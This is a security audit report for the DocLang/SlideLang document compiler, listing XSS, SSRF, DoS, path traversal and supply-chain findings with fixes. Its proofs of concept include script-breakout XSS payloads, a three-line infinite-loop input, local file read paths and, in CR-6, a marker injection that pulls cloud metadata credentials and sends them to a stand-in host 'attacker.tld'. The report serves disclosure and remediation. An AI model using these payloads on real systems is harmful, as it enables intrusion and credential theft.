> **Status note (added 2026-07-18):** this documents the security posture **as it was on
> 2026-07-06**. Almost every Critical/High/Medium finding below was fixed via a remediation
> sequence of ~20 PRs between 2026-07-06 and 2026-07-11 (search closed issues labeled
> `security` + `audit-2026-07` for the record of what was fixed and how it was verified). Kept
> in full, unedited, both because it's a real historical record and because **~65 code comments
> across all 3 modules cite specific finding IDs from this document** (e.g. `AL-1`, `CR-6`,
> `ME-2`) as the rationale for defensive code — moving or heavily editing this file would break
> those citations for anyone reading the source. Do not treat the "does NOT meet enterprise-grade
> standards" framing below as current; only #43 (CI/SAST/signed releases, partial), #35
> (`yaml.v3`, kept deliberately), and #33 (docxgo governance, blocked on an org-admin action)
> remain genuinely open from this audit.

# Security Audit — ZiraDocs / DocLang CLI

**Date:** 2026-07-06
**Scope:** `slidelang-core`, `slidelang-cli`, `doclang-cli` (full monorepo).
**Threat model:** the attacker controls the content of the `.slidelang` / `.doclang` file (including YAML frontmatter, image sources, diagram content, chart JSON, map markers, and theme names). The victim compiles the document and **publishes/serves the output** (HTML/PDF/DOCX) or runs the build on a server/CI that processes untrusted documents.

This report consolidates five parallel audits (XSS/injection, SSRF/execution, path traversal, DoS/parser, supply chain). Findings marked **[VERIFIED]** were reproduced by running the actual code; **[CONFIRMED]** were traced statically from attacker input to the sink.

---

## 1. Executive summary

The code shows pockets of security awareness (there's a `sanitizer.go` with a robust `SanitizeURL`, zip-slip guards, safe temp files, no hardcoded secrets, no `InsecureSkipVerify`). However, **the product does NOT meet enterprise-grade standards today**: there are multiple zero-interaction XSS issues in the default output of both tools, a trivial DoS that hangs the process with a 3-line file, arbitrary local file reads embedded in published output, downloading and executing a browser binary with no integrity verification, and a total absence of security tooling in the lifecycle (no CI, SAST, dependency scanning, or signed releases).

**Count by severity (deduplicated):**

| Severity | Count | Nature |
|-----------|----------|------------|
| 🔴 Critical | 6 | Zero-interaction XSS in default output; JS execution in the build browser (SSRF/exfiltration) |
| 🟠 High | 7 | Chrome sandbox disabled; download without checksum; infinite-loop DoS; XSS in mermaid/maps; local file reads in DOCX/PDF |
| 🟡 Medium | 9 | Outdated Chromium; theme traversal; SSRF in PlantUML; default network egress; no SRI; personal fork; committed ELF binary; no input cap |
| 🔵 Low/Info | 13 | No CI/SAST; unmaintained yaml.v3; placeholder contact; go.mod hygiene; no recover/fuzzing; logs to stdout; preview on 0.0.0.0; no CSP |

**Secure SDLC maturity: Level 0–1 (ad hoc).** There is no CI, SAST, dependency scanning, fuzzing, signed releases, SBOM, or a working vulnerability-report channel.

---

## 2. Critical findings (🔴)

### CR-1 — XSS via `</script>` breakout in chart JSON (default output) — [CONFIRMED]
**Location:** `slidelang-core/renderer/html.go:508` (`renderChartBrowser`); raw origin in `slidelang-core/elements/chart.go:83` (`chart.RawJSON = jsonContent`).
The chart JSON is emitted **without escaping** inside a `<script>`:
```go
html.WriteString(fmt.Sprintf(`<script type="application/json" class="chart-config">%s</script>`, chartConfig))
```
**Exploit:**
```
<<chart: bar>>
{"type":"bar","data":{"labels":["</script><img src=x onerror=alert(document.domain)>"]}}
```
`</script>` inside a JSON string is valid JSON but closes the `<script>` element in the HTML parser → the `<img onerror>` executes on load, with no interaction required. Present in `doclang build --format html` by default.
**Fix:** re-serialize with `json.Marshal` (keeps `<`,`>`,`&` as `\u00xx`) instead of passing `RawJSON` verbatim, or escape `</` → `<\/` before writing, or move the config to a `data-*` attribute and use `JSON.parse`.

### CR-2 — XSS in doclang section/subsection titles (default output) — [CONFIRMED]
**Location:** `slidelang-core/renderer/document_html.go:1544,1547` (`<h1 id="%s">%s</h1>` with unescaped `titleProcessed`); subsections in `slidelang-core/parser/document_flex.go:338` (`NewRawHTMLTextElement`, `IsRawHTML=true` → printed verbatim in `renderer/html.go:68-70`). Also reflected in the TOC (`document_html.go:1262-1266`).
**Exploit:**
```
# Intro<img src=x onerror=alert(1)>
## <script>alert(document.cookie)</script>
```
The `id="%s"` anchor goes through `sanitizeAnchor` (fine), but the visible text doesn't. Zero-interaction XSS in doclang's primary output, also reflected in the TOC and sidebar.
**Fix:** `EscapeHTML` the heading text before building `<hN>` / the TOC `<a>`; escape subsection text before markdown formatting.

### CR-3 — XSS via raw frontmatter `title` in `<title>` (doclang) — [CONFIRMED]
**Location:** `slidelang-core/renderer/document_html.go:219` (`<title>%s</title>` with unescaped `doc.FrontMatter.Title`; also in page-view headers/footers `:1588`, `:1637`).
**Exploit (frontmatter):** `title: "</title><script>alert(1)</script>"`
**Fix:** `EscapeHTML(title)` at every `docTitle` interpolation site.

### CR-4 — slidelang generator uses `text/template` (no auto-escaping) → widespread XSS — [CONFIRMED]
**Location:** `slidelang-cli/internal/generator/html_modular.go:8` imports **`text/template`**; the converter (`internal/generator/data/converter.go`) stores raw strings (only variable-substituted) and the template (`internal/generator/template/base.go`) prints them with no filtering. (Note: the `generateHTML` in `html.go` that does use `html/template` is **dead code**, never called.)
**Confirmed unescaped fields** (all attacker-controlled): `<title>` (`:328`), slide titles/subtitles → `<h1>/<h2>` (`:362-382`), code `data-language`/`class="language-…"` (`:516,519`), table caption (`:538`), special-block icon (`:585,595`), `data-block-type` (`:582,590`), mermaid/chart/map titles (`:605,615,628`), quote author/source (`:641-642`), directive `data-{{key}}="{{value}}"` (`:706,716`).
**Exploit (quote author):** `— <img src=x onerror=alert(1)>` → `<cite><img src=x onerror=alert(1)></cite>`. Zero-interaction XSS in practically every element type of `slidelang build --format html`.
**Fix (highest leverage):** migrate the generator to **`html/template`** (auto-escapes attributes/JS/URL by context). Fields that are legitimately markdown already use `{{. | markdown}}` (safe); everything else must not go out raw.

### CR-5 — `toJSON` reverses the `<`/`>`/`&` escape inside `<script>` (slidelang metadata) — [VERIFIED]
**Location:** `slidelang-cli/internal/generator/config/functions.go:39-49` (`toJSON` does `json.Marshal` and then `ReplaceAll("<","<")`, `">",">"`, `"&","&"`); consumed inside `<script type="application/json" id="slidelang-metadata">` in `template/base.go:438` (chart config), `:445` (mermaid content), `:453-454` (map markers/options).
`json.Marshal` leaves output safe for `<script>` by escaping `<>&`; `toJSON` **undoes** that protection. **Reproduced:** a mermaid diagram with content `</script><script>alert(...)</script>` produced the literal, unescaped `</script><script>alert(...)` in the generated HTML, breaking the metadata block and injecting an executable `<script>` (verified in the output file, line 723).
**Fix:** remove the `</>/&` un-escaping in `toJSON`; if `<`/`>` are needed in mermaid text, keep them escaped and decode in JS.

### CR-6 — Arbitrary JS execution in the build's headless Chrome (SSRF + exfiltration) — [CONFIRMED]
**Location:** `slidelang-core/renderer/chromium_renderer.go:289,416` (`const config = %s;` with verbatim `RawJSON`), `:586` (`iconUrl` with unescaped marker color), `:593` (`bindPopup('%s')` with label), `:161,230` (verbatim mermaid content). Unvalidated origin: `elements/map.go:299`, `elements/chart.go:83`. Reachable with **default flags** in `doclang build --format docx` (maps/charts are always rasterized: `docx.go:1066,1138`) and in **all** PDF generation.
User data is concatenated into HTML/JS that a headless Chrome running with `--no-sandbox` **executes** from a `file://` origin.
**Exploit (marker color, with no escaping at all):**
```
<<map:>>
marker: 40.0, -74.0, "hi", "", red'});fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(t=>new Image().src='http://attacker.tld/x?d='+btoa(t));({a:'
<</map>>
```
**Impact:** SSRF to the cloud metadata endpoint (`169.254.169.254`), `localhost`, and internal services on the build/CI host; blind exfiltration of the fetched data; full JS-execution surface in a browser with **no sandbox** (see AL-1).
**Fix:** never concatenate user data into the HTML/JS sent to chromedp — pass data via `Evaluate`/JSON or a `dataset` read by static, trusted JS; re-marshal `RawJSON`; validate color against an allowlist (`^#[0-9a-fA-F]{6}$`); neutralize `</script`; add CSP to the render templates (`connect-src 'none'`).

---

## 3. High findings (🟠)

### AL-1 — Headless Chrome always launched with `--no-sandbox` — [CONFIRMED]
**Location:** `slidelang-core/renderer/chromium_manager.go:254` — `chromedp.Flag("no-sandbox", true)`, unconditional. Renders user-derived content **plus remote CDN scripts** with the renderer sandbox disabled. A renderer memory-corruption bug (malicious SVG/font/JS) escapes straight to code execution as the build/CI user. Amplifies CR-6, LI-1, and LI-2.
**Fix:** don't force `no-sandbox`; run sandboxed by default, enable it only when the environment requires it (root in a container) after explicit detection/flag with a warning. Add `--disable-extensions`, `--disable-background-networking`.

### AL-2 — The Chromium installer doesn't verify the integrity of the downloaded binary — [CONFIRMED]
**Location:** `slidelang-core/renderer/chromium_installer.go:154` (`http.Get`), `:204` (extracts), `:77` (`Chmod 0755`), then run as the browser. A ~150 MB zip is downloaded from `storage.googleapis.com` (HTTPS) but **with no SHA-256 checksum or signature** before extracting, marking executable, and running. A corporate TLS-intercepting proxy, compromised mirror, or cache poisoning → **RCE**. Also, `http.Get` with no timeout (hangs/DoS) and an unbounded-size stream.
**Fix:** pin and verify the SHA-256 published by Chrome-for-Testing before extracting; fail on mismatch; use an `http.Client` with a timeout; download to temp with restricted permissions, verify, then move. Remove the dead `getChromiumDownloadURL` code (`chromium_manager.go:225`) that points to unpinned snapshots.

### AL-3 — Infinite-loop DoS + memory growth in `processInlineMarkdown` — [VERIFIED]
**Location:** `slidelang-core/parser/document_flex.go:366-389`, reachable via `doclang-cli/internal/cli/build.go:103`. When a `*` is preceded by `<`, the "skip" branch reinserts the placeholder **after** the `*`, leaving it in place → the next iteration re-encounters the same `*` (`result[start-1]=='<'`) forever, growing the string 19 bytes per pass (quadratic in time + memory).
**Exploit (3-line file):**
```
# T

### <*

x
```
**Reproduced:** the real binary sat at **202% CPU indefinitely** (hung > 8 s, RSS growing). **Also triggers with benign input**: any heading with a `*` right after `<`, e.g. `## Using <*ptr>`. Only affects doclang. **There is no `recover()` anywhere in the repo.**
**Fix:** in the `<` guard branch, advance the search cursor past the `*` (search from `start+1`) instead of reinserting the placeholder; or better, replace it with `renderer.ProcessInlineMarkdownFormats` (RE2, single-pass). Add an iteration/length cap + `defer/recover` + a time budget at both CLIs' entrypoints.

### AL-4 — Arbitrary local file read embedded in DOCX via image `source` — [CONFIRMED]
**Location:** `doclang-cli/internal/generator/docx.go:949-955` → `AddImageWithSize` → `os.ReadFile(path)`. Unlike the HTML path (`renderer/html.go:143` uses `SanitizeURL`), the DOCX path applies no sanitization, doesn't reject absolute paths, and doesn't confine to a base directory.
**Exploit:** `![logo](/Users/victim/Desktop/passport-scan.png)` or `![x](../../../../etc/...)` → the file's bytes get copied into `word/media/…` inside the shared `.docx`. Limited to decodable image files (png/jpeg/gif/bmp/tiff/webp), but cross-user exfiltration of images is a serious information-disclosure issue.
**Fix:** shared helper `resolveConfinedPath(base, userPath)` that does `filepath.Clean`, rejects absolute paths/`..`, and validates a prefix; confine image sources to the document tree or an explicit `--asset-root`.

### AL-5 — Local file inclusion in PDF via `<img src="/absolute/path">` (bypasses the `file:` block) — [CONFIRMED]
**Location:** `slidelang-core/renderer/sanitizer.go:61` (allows the empty `""` scheme) + `chromium_renderer.go:55-76` (loads the generated HTML from a temp `file://`). `SanitizeURL` blocks the `file:` scheme but allows absolute paths with an empty scheme. `<img src="/etc/hostname">` resolves against the `file://` base → `file:///etc/hostname`, evading the block, and Chrome rasterizes the local file into the PDF.
**Exploit:** `![x](/Users/victim/Pictures/private.png)` with `--format pdf`.
**Fix:** in `SanitizeURL`, reject absolute paths and `..` when the context is `file://`; load user content via `page.SetDocumentContent`/`data:` instead of a temp `file://`; launch Chrome with file access disabled.

### AL-6 — XSS in doclang Mermaid: raw content + `securityLevel: 'loose'` — [CONFIRMED]
**Location:** raw content in `slidelang-core/renderer/html.go:296` (`<div class="mermaid">%s</div>`); Mermaid initialized with `securityLevel: 'loose'` in `document_html.go:1038`. Two problems: (a) raw content is placed into the DOM before Mermaid runs, so `</div><img src=x onerror=alert(1)>` breaks out directly; (b) `loose` re-enables in-diagram HTML, `click…href`, and `<script>`/`<foreignObject>` passthrough.
**Fix:** escape the mermaid content for the text node (Mermaid reads `textContent`, escaping doesn't break rendering) and set `securityLevel: 'strict'` with `htmlLabels:false`.

### AL-7 — DOM XSS in map markers via a round-trip through `dataset` — [CONFIRMED]
**Location:** attributes written with `EscapeHTMLAttribute` in `renderer/html.go:972-990`, but consumed in the Leaflet script in `document_html.go:1094,1108,1116-1120`, which reconstructs innerHTML: reading `marker.dataset.color` **decodes** the value back to its original bytes, which get concatenated into `divIcon` `html:` / `bindPopup` with no re-escaping → the escaping is fully undone.
**Exploit (color):** `'"><\/div><img src=x onerror=alert(1)><div "'` → injected when the marker loads (**on load, no click needed**).
**Fix:** don't reconstruct HTML from `dataset`; use `textContent`/DOM APIs; validate color against a strict pattern; build popups with `L.popup` + text nodes.

---

## 4. Medium findings (🟡)

| ID | Finding | Location | Fix |
|----|----------|-----------|-----|
| ME-1 | **Outdated Chromium version** hardcoded at `131.0.6778.69` (~20 months old, known CVEs in the wild) | `chromium_installer.go:93` | Resolve stable via chrome-for-testing's JSON, or bump regularly + verify hash |
| ME-2 | **Path traversal via theme name** (frontmatter/flag): `filepath.Join(searchPath, name+".json")` with no `..`/absolute-path cleaning | `doclang-cli/themes/document/loader.go:45`; `slidelang-cli/.../css/themes/loader.go:122-124` | Reject separators/`..`/absolute paths; treat the name as an opaque token |
| ME-3 | **SSRF in PlantUML**: no guard against redirects to private IPs (follows up to 10 redirects) + no response-size cap (`io.ReadAll`) | `plantuml_fetcher.go:67,103,114` | `CheckRedirect` that blocks private/link-local/metadata ranges; `io.LimitReader` |
| ME-4 | **Default network egress**: `--render-mode` defaults to `browser` (CDN); PDF/DOCX always contact 4–6 external origins; PlantUML sends the diagram source to the public `plantuml.com` server by default | `doclang-cli/internal/cli/build.go:234`; `plantuml_fetcher.go:26` | Default to offline/self-contained, or an explicit warning about outbound hosts; fail-closed `--offline` mode |
| ME-5 | **CDN scripts with no SRI** + floating versions (`mermaid@10`, `chart.js@4`) — a CDN compromise changes what every document, and the build renderer itself, executes | `document_html.go:999-1021`; `chromium_renderer.go:153,208,276,403,587,610` | Pin exact version + `integrity="sha384-…" crossorigin` |
| ME-6 | **Core dependency is a personal fork**, `github.com/mmonterroca/docxgo/v2` (same author as the repo; already had a release with a broken go.mod) — bus factor 1, no external review | `doclang-cli/go.mod` | Move to an org with branch protection + 2FA; document upstream divergence; `govulncheck`; or vendor it |
| ME-7 | **3.1 MB committed ELF binary** in the library module (`test_norm`) + `test_norm.go` (`package main`) at the root — shipped to every consumer via `go get`, trips malware scanners | `slidelang-core/test_norm`, `test_norm.go` | `git rm`; move the harness to `cmd/` or delete it; `.gitignore` binaries |
| ME-8 | **No input size cap** + ~10x amplification from the normalizer (every rule does `Split/Join` on the whole document; 20 MB → 3.3 s / 206 MB alloc) | `slidelang-cli/.../build.go:151`; `doclang-cli/.../build.go:84`; `ai/normalizer/normalizer.go:152-224` | `io.LimitReader`/size rejection before parsing; parse once and reuse |
| ME-9 | **Unsafe markdown variant** emits `href` without `SanitizeURL` (reachable via the TOC path) | `renderer/markdown.go:113-114`, via `document_html.go:1380` | Route through `SanitizeURL`+`EscapeHTML` or remove the non-`Secure` functions |

---

## 5. Low / informational findings (🔵)

| ID | Finding | Location / Note |
|----|----------|------------------|
| BA-1 | **No CI, SAST, dependency scanning, or signed releases** — `.github/` only has `copilot-instructions.md`; hardcoded version `1.0.0` with no ldflags | Posture gap (see Phase 3 plan) |
| BA-2 | **`gopkg.in/yaml.v3` archived** (April 2025, no future fixes) — the first parser to touch untrusted input | All 3 `go.mod` files; migrate to a maintained fork |
| BA-3 | **Placeholder security contact** `security@ziradocs.com "(if available)"` + wrong repo URL | `SECURITY.md` |
| BA-4 | **go.mod hygiene**: direct deps mis-marked `// indirect` (chromedp); `chai2010/webp` (cgo, CVE history) required but **never imported**; `go 1.24` vs `1.25.2` skew | `go mod tidy`; remove webp |
| BA-5 | **No global `recover()` or fuzzing** — a panic exposes a stack trace with absolute paths; the parser is an ideal candidate for native Go fuzzing | `cmd/*/main.go` |
| BA-6 | **Logs go to stdout** (breaks JSON pipelines) + no `\n`/`\r` sanitization on user values (log forging) | `slidelang-core/util/logger.go` |
| BA-7 | **Theme preview listens on `0.0.0.0`** (all interfaces) | `slidelang-cli/internal/cli/preview_theme.go:127` — bind to `127.0.0.1` |
| BA-8 | **Chromium zip extraction**: doesn't explicitly reject symlink entries; no size cap (zip bomb) | `chromium_installer.go:204-266` (the zip-slip guard does exist) |
| BA-9 | **Per-line regex recompilation** in normalizer loops (constant, not superlinear) | `chart_json.go:45`, `yaml_escaping.go:64,127` — hoist to a package-level `var` |
| BA-10 | **No Content-Security-Policy** on any generated document (defense in depth) | Add `<meta http-equiv="CSP">` once injections are fixed |
| BA-11 | **Latent CSS injection**: `generateThemeVariables` interpolates name/value with no escaping (not reachable from markup today, would be if external themes with variables are accepted) | `document_html.go:1681-1689` |
| BA-12 | **`sanitizeBookmarkID` doesn't strip separators** `/`,`\` (not exploitable today) | `docx.go:63-72` |
| BA-13 | **Output clobbered without confirmation** + `init` with an unsanitized name (the operator's own argument) | `doclang-cli/.../build.go:120`, `init.go:29-40` |

---

## 6. What's done well (preserve this)

- **`SanitizeURL` is genuinely robust** — empirically verified to block `javascript:` across every obfuscation tested (spaces, mixed case, `java\tscript:`, `java\nscript:`, nulls, `&colon;`). Go's `url.Parse` rejects control characters.
- **`EscapeHTMLAttribute`** escapes `& < > " '` and strips CR/LF/tab (where applied).
- **The image element** sanitizes `src` and escapes `alt`/`caption` on both HTML paths.
- **Code blocks** are HTML-escaped on both paths.
- **Correct zip-slip guard** in the installer (`chromium_installer.go:222-225`).
- **Safe temp files**: `os.CreateTemp` (random name, 0600) and `os.MkdirTemp` + `defer RemoveAll`; no TOCTOU.
- **Reasonable permissions** (0644/0755/0600), no `0777`/world-writable.
- **No `InsecureSkipVerify`**; TLS with secure defaults; no `md5`/`sha1` for security purposes; no `math/rand` for temp names; no `unsafe`/cgo in compiled code; no `//go:generate`.
- **Secrets: clean** — grepped the whole tree and history: only instructional placeholders.
- **No ReDoS** — every regex is RE2 (linear). The real DoS is a hand-written loop, not regex.
- **YAML bomb mitigated** — billion-laughs (43M expansions) parsed in ~1ms by yaml.v3.
- **No panics** across broad fuzzing (5000-column tables, 100k headers, unterminated fences, 20k nesting). Comma-ok type assertions throughout.
- **`go.sum` complete** in all 3 modules; `go mod verify` passes; `replace` directives point inside the repo; `govulncheck` reports 0 vulnerabilities in reachable code (1 Windows-only vuln in `golang.org/x/sys@v0.34.0` that's unreached — update to v0.44.0 regardless).

---

## 7. Phased remediation plan

### Phase 0 — Stop the bleeding (P0, ~2–4 days)
Fix what's confirmed exploitable and reachable by default. Small, low-risk changes.
1. **AL-3** infinite-loop DoS — fix the cursor in `document_flex.go` (also fixes benign docs). **[blocking]**
2. **CR-1** chart RawJSON breakout — re-marshal with `json.Marshal`.
3. **CR-2 / CR-3** doclang headings and `<title>` — `EscapeHTML`.
4. **CR-5** `toJSON` un-escaping — remove the `</>/&` `ReplaceAll`.
5. **ME-8 + BA-5** — input size cap (`io.LimitReader`, e.g. 10 MB) + `defer/recover` + timeout at both CLIs' entrypoints (contains any future AL-3-style loop).

### Phase 1 — Core hardening (P1, ~1–2 weeks)
6. **CR-4** migrate the slidelang generator from `text/template` → `html/template` (eliminates the entire CR-4 XSS class and hardens the metadata script). Remove the dead `html.go`.
7. **CR-6 / AL-6 / AL-7** — stop concatenating user data into chromedp's HTML/JS; escape mermaid content + `securityLevel:'strict'`; build map markers with text nodes and validate color.
8. **AL-1** — remove `--no-sandbox` by default (gate it on root/container detection).
9. **AL-2 / ME-1** — verify the Chromium download's SHA-256; bump the version; add a timeout + size limit; delete the dead `getChromiumDownloadURL` code.
10. **AL-4 / AL-5 / ME-2** — shared `resolveConfinedPath` helper applied at every `elem.Source`/theme-name read site; fix the empty scheme in `SanitizeURL` for the `file://` context.
11. **ME-9** — retire the non-`Secure` markdown helpers.

### Phase 2 — Supply chain and network posture (P2, ~2–4 weeks)
12. **ME-3** — SSRF guards (redirects + private IPs) and `io.LimitReader` on every fetcher.
13. **ME-4 / ME-5 / BA-10** — offline/self-contained mode by default (or an explicit egress warning); SRI + pinned CDN versions; CSP on output.
14. **ME-7 / BA-4** — `git rm` the ELF binary + `test_norm.go`; `go mod tidy` (remove `webp`, fix `// indirect`, align `go`/`toolchain`).
15. **ME-6 / BA-2** — governance for the docxgo fork (org + 2FA + rebase cadence); a `yaml.v3` migration plan.
16. **BA-7 / BA-8 / BA-9 / BA-11 / BA-12** — preview on `127.0.0.1`; reject symlinks + cap zip-bomb size; hoist regexes; validate CSS variables; whitelist in `sanitizeBookmarkID`.

### Phase 3 — Secure SDLC scaffolding (P3, ongoing)
17. **CI** per module: `go build && go vet && go test` + `govulncheck` + `gosec` + CodeQL.
18. **Dependabot/Renovate** for all 3 go modules + npm (`doclang-vscode`) + github-actions (pinned SHAs).
19. **Signed releases**: goreleaser with `-trimpath`, `-ldflags "-s -w -X main.version=…"`, checksums, cosign signature/attestation, SBOM (syft/cyclonedx-gomod).
20. **Native fuzzing** (`go test -fuzz`) for `Parse`/`FrontMatterParser`/`DocumentFlexParser` in CI.
21. **BA-3 / BA-6** — a real report channel (GitHub Private Vulnerability Reporting) + SLA + supported-versions table; logs to `stderr` + `\n`/`\r` sanitization; document a threat model covering headless Chrome, the CDN, PlantUML egress, and the installer's supply chain.

---

## 8. Methodology and verification

- Five parallel audits by dimension (XSS, SSRF/execution, path traversal, DoS/parser, supply chain), each tracing from input to sink.
- `govulncheck` run across all 3 modules (0 vulnerabilities in reachable code).
- Independent empirical verification: reproduced the `toJSON` XSS (inspected the output file), the infinite-loop DoS (process hung at 202% CPU), and static confirmation of the sinks for CR-1/CR-2/CR-3, AL-1/AL-2/AL-4, ME-1/ME-2/ME-7.

> **Note:** The existing `SECURITY.md` correctly describes prior XSS work on the text/attribute path, but its scope is partial: it doesn't cover the `text/template` generator, the chromedp path, diagrams/charts/maps, network egress, or the installer's supply chain. This report should replace `SECURITY.md`'s "status" section once Phase 0–1 has been executed.
